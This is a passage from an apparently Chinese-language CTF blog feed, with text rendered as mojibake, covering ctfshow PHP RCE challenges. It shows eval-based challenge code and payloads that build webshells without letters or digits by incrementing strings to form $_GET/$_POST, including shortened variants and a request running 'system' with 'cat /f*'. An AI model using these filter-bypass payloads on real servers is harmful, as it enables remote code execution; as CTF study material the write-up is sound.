invoke__">str_replace</span>(<span class="string">&quot;(&quot;</span>,<span class="string">&quot;æ‹¬å·&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;ç‚¹&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æœ€åæ‰§è¡Œçš„æ˜¯evalï¼Œè€Œè¿‡æ»¤çš„åªæœ‰( å’Œ. ï¼Œè€Œphp <a href="https://so.csdn.net/so/search?q=eval%E5%87%BD%E6%95%B0&spm=1001.2101.3001.7020">evalå‡½æ•°</a>çš„ä½œç”¨æ˜¯æŠŠå­—ç¬¦ä¸²æŒ‰ç…§PHPä»£ç æ¥è®¡ç®—ï¼Œæ¯”å¦‚æœæˆ‘ä»¬å†™å…¥ echo <code>1</code> å°±ä¼šå†™å…¥1 ï¼Œå¦‚æœæˆ‘ä»¬å†™å…¥çš„æ˜¯ä¸€å¥è¯æœ¨é©¬ï¼Œå°±å¯ä»¥æˆåŠŸæ¤å…¥æœ¨é©¬ï¼Œæ‰§è¡Œrce</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><blockquote><h3 id="code-echo-1-cat-f"><a href="#code-echo-1-cat-f" class="headerlink" title="code=echo ``;&amp;1=cat /f*"></a><code>code=echo ``;&amp;1=cat /f*</code></h3></blockquote><h2 id="RCE2"><a href="#RCE2" class="headerlink" title="RCE2"></a>RCE2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶Y4tackerä½¬åœ¨åƒç“œæ¯æŠ•ç¨¿çš„shellmeæ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>åŸºæœ¬æŠŠèƒ½ç”¨çš„éƒ½è¿‡æ»¤äº†ï¼Œåªå‰©ä¸‹$()_+;[],.&#x3D;&#x2F;å­—ç¬¦ï¼Œpç¥çš„æ–‡ç« å¥½æ—©ä¹‹å‰å°±æå‡ºè¿‡ï¼Œè‡ªå¢<a href="https://so.csdn.net/so/search?q=rce&spm=1001.2101.3001.7020">rce</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell | ç¦»åˆ«æ­Œ</a></p><p>æ€è·¯å°±æ˜¯ï¼Œæˆ‘ä»¬rceéœ€è¦å­—æ¯ï¼Œä½†å­—æ¯éƒ½è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¦æƒ³åŠæ³•å»æ„é€ å­—æ¯ï¼Œpç¥æ˜¯ç”¨</p><p>å¼ºåˆ¶è¿æ¥æ•°ç»„å’Œå­—ç¬¦ä¸²ï¼Œæ•°ç»„å°†è¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå…¶å€¼ä¸º<code>Arrayï¼Œè€Œæˆ‘ä»¬å¦‚æœå–Arrayçš„ç¬¬[0]</code>ä¸ªå­—æ¯çš„è¯å°±æ˜¯Aï¼Œè€ŒA++å°±æ˜¯Bï¼Œä¾‹å¦‚ï¼š</p><p><img src="/2023/10/01/%E5%AE%8F/image/37853e892a9643ac805787746756841c-1700994174279-21.png"></p><p> ä¹‹åæˆ‘ä»¬å¯ä»¥ç”¨ . æŠŠå­—æ¯æ‹¼æ¥èµ·æ¥ï¼Œ</p><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p>æ³¨é‡Šæœ‰åˆ†è§£ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;  <span class="comment">//å¾—åˆ°Array</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;/&#x27;</span>==<span class="string">&#x27;+&#x27;</span>];   <span class="comment">//è®©[]é‡Œçš„å€¼æŠ¥é”™è¿”å›0,å–Array[0]=Aï¼Œæ­¤æ—¶$_=A</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;   <span class="comment">//è®©$____=_ï¼Œåé¢å®¹æ˜“æ‹¼æ¥</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;   <span class="comment">//å°†Aèµ‹ç»™$__</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;  <span class="comment">//Aè‡ªå¢åˆ°Gï¼Œæ­¤æ—¶$__=G</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>; <span class="comment">//å°†_å’ŒGæ‹¼æ¥èµ·æ¥ï¼Œæ­¤æ—¶$____=_G</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;   <span class="comment">//å†å°†$__è¿˜åŸæˆA</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;  <span class="comment">//Aè‡ªå¢åˆ°E,æ­¤æ—¶__=E</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;  <span class="comment">//Eå’Œ_Gæ‹¼æ¥ï¼Œæ­¤æ—¶$____ä¸º_GE</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;  <span class="comment">//å†å°†__æ¢æºæˆA</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;  <span class="comment">//Aè‡ªå¢æˆTæ­¤æ—¶__=T</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;  <span class="comment">//å†æ‹¼æ¥æˆ_GETï¼Œæ­¤æ—¶$____=_GET</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$____</span>;   <span class="comment">//ä¸ºäº†æ–¹ä¾¿èµ·è§ï¼Œæˆ‘ä»¬æŠŠ____æ¢æˆ_</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="variable">$$_</span>[_])(<span class="variable">$$_</span>[__]);  <span class="comment">//æ‹¼æˆæˆ‘ä»¬æƒ³è¦çš„($_GET[_])($_GET[__]),ä¼ å…¥_å’Œ__å‘½ä»¤æ‰§è¡Œå³å¯  </span></span><br></pre></td></tr></table></figure><p>æœ€åæ¢æˆä¸€è¡Œrceå³å¯ </p><h2 id="RCE3"><a href="#RCE3" class="headerlink" title="RCE3"></a>RCE3</h2><h3 id="æºç -1"><a href="#æºç -1" class="headerlink" title="æºç "></a>æºç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶Y4tackerä½¬åœ¨åƒç“œæ¯æŠ•ç¨¿çš„shellmeæ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">105</span>) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z2-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¿™ä¸ªè¿‡æ»¤å’Œrce2å·®ä¸å¤šï¼Œä½†å§1å’Œ0ç»™æ”¾å‡ºæ¥äº†ï¼Œä¹Ÿé™åˆ¶äº†é•¿åº¦&lt;&#x3D;105ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹è¿™ä¸ªæ–‡ç« </p><p><a href="https://blog.csdn.net/rfrder/article/details/119535886">BSides Noida CTF 2021 Web Calculate_bfengjçš„åšå®¢-CSDNåšå®¢</a><img src="/2023/10/01/%E5%AE%8F/image/12da9e9234fe43ac8601092b9b0a8d2f-1700994174279-22.png"></p><p>å¾—åˆ°NANå†ç”¨ä¸Šé¢ç›¸åŒçš„æ–¹æ³•è·å¾—N,ä»Nå¼€å§‹æ„é€ çš„è¯é•¿åº¦å°±æ¯”ä¸Šä¸€ä¸ªæ–¹æ³•å°‘å¤šäº†ï¼ŒåŸç†è¿˜æ˜¯ä¸Šä¸€é¢˜çš„è‡ªå¢ï¼Œè¯•ç€æ„é€ ä¸€ä¸‹ï¼Œå½“æˆ‘æ˜¯æƒ³ç›´æ¥$a[0]çš„æ—¶å€™ï¼Œä»–æ²¡æœ‰å›æ˜¾ï¼ŒåŸæ¥æ˜¯å› ä¸ºç°åœ¨çš„NANè¿˜ä¸ç®—å­—ç¬¦ä¸²,æ‰€ä»¥åé¢è¦åœ¨æ‹¼æ¥ä¸€ä¸ªä¾‹å¦‚</p><p><img src="/2023/10/01/%E5%AE%8F/image/96dcc086cb314c4c9a6f2503450c2089-1700994174279-23.png"></p><p>å°±å¯ä»¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„Näº†ï¼Œä½†æˆ‘æˆ‘ä»¬éœ€è¦å­—æ¯æ‰èƒ½æ„é€ Nï¼Œå°±ç”¨ä¸Šä¸€é¢˜åŒæ ·çš„æ–¹æ³•æ„é€ å‡ºAæ¥ï¼Œå› ä¸º0å¯ä»¥ç”¨äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ä¸ç”¨è®©æŠ¥é”™ç›´æ¥ç”¨[0]å°±å¯ä»¥äº†</p><p><img src="/2023/10/01/%E5%AE%8F/image/7bbcda92852545ce97dbd2d22b130783-1700994174280-24.png"></p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°Näº†</p><p><img src="/2023/10/01/%E5%AE%8F/image/fc6729792a6c44d68b05e5e91c2b82a7-1700994174280-25.png"></p><p>ä¹‹åå†è·Ÿä¸Šä¸€æ­¥ä¸€æ ·ä¸€æ­¥ä¸€æ­¥è‡ªå¢å°±å¯ä»¥äº†</p><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><p>æ³¨é‡Šæœ‰è§£æã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=([].[])[<span class="number">0</span>];    <span class="comment">//å¾—åˆ°Array</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>/<span class="variable">$_</span>.<span class="variable">$_</span>)[<span class="number">0</span>];   <span class="comment">//__=N</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>++;  <span class="comment">//O</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++;  <span class="comment">//æ‹¼æ¥PO</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;  <span class="comment">//S</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>++;  <span class="comment">//T</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$__</span>.<span class="variable">$_</span>;  <span class="comment">//æ‹¼æ¥_å’ŒPOST</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[<span class="number">1</span>]);  <span class="comment">//$_POST[0]($_POST[1])</span></span><br></pre></td></tr></table></figure><h2 id="RCE4ï¼ŒRCE5"><a href="#RCE4ï¼ŒRCE5" class="headerlink" title="RCE4ï¼ŒRCE5"></a>RCE4ï¼ŒRCE5</h2><p>ä¹‹åå°±æ˜¯è¶Šæ¥è¶Šå°‘çš„é•¿åº¦ï¼Œå°±ç›´æ¥åˆ†æä¸€ä¸‹å¸ˆå‚…ä»¬çš„pyload</p><h3 id="72ä½"><a href="#72ä½" class="headerlink" title="72ä½"></a>72ä½</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">_</span>(a/a)[a];<span class="comment">//N</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">++<span class="variable">$a</span>;<span class="comment">//O</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$a</span>.<span class="variable">$a</span>++;<span class="comment">//PO</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>++;<span class="variable">$a</span>++;<span class="comment">//R</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$_</span>.++<span class="variable">$a</span>.++<span class="variable">$a</span>;<span class="comment">//_POST</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$$_</span>[a](<span class="variable">$$_</span>[_]);<span class="comment">//$_POST[a]($_POST[_])</span></span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2b;$_=_.$_.%2b%2b$%ff.%2b%2b$%ff;$$_[%ff]($$_[_]);&amp;%ff=system&amp;_=cat /f* </span><br></pre></td></tr></table></figure></blockquote><h3 id="68ä½"><a href="#68ä½" class="headerlink" title="68ä½"></a>68ä½</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="title function_ invoke__">_</span>(a/a)[_];<span class="comment">//N</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=++<span class="variable">$_</span>;<span class="comment">//O</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$$a</span>[<span class="variable">$a</span>=_.++<span class="variable">$_</span>.<span class="variable">$a</span>[<span class="variable">$_</span>++/<span class="variable">$_</span>++].++<span class="variable">$_</span>.++<span class="variable">$_</span>](<span class="variable">$$a</span>[_]);<span class="comment">//å·§å¦™çš„æŠŠä¸¤æ¬¡$_++æ”¾åœ¨ä¸€èµ·</span></span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=_.++$_.$a[$_++/$_++].++$_.++$_//$aç›´æ¥æ‹¼æ¥å‡º_POST $$a[_POST]($$a[_])//$_POST[_POST]($_POST[_]) </span><br></pre></td></tr></table></figure></blockquote><h3 id="62ä½"><a href="#62ä½" class="headerlink" title="62ä½"></a>62ä½</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="title function_ invoke__">_</span>(_._)[_];<span class="comment">//N  //æœ¬åœ°ä½¿ç”¨å°±ç”¨(_._._)[_]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$%FA=++<span class="variable">$_</span>;<span class="comment">//O</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$$%FA[$%FA=_.++<span class="variable">$_</span>.$%FA[<span class="variable">$_</span>++/<span class="variable">$_</span>++].++<span class="variable">$_</span>.++<span class="variable">$_</span>]($$%FA[%FF]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//å°†æ‹¼æ¥æ”¾åˆ°åŒä¸€è¡Œ,çœŸçš„å¤ªå‰å®³äº†,æˆ‘åªèƒ½æ„Ÿå¹ä¸€å¥nb</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ—¥å¸¸é¢˜ç›®ç»ƒä¹ ï¼ˆä¸€ï¼‰</title>
      <link href="/2023/09/28/%E6%97%A5%E5%B8%B8%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
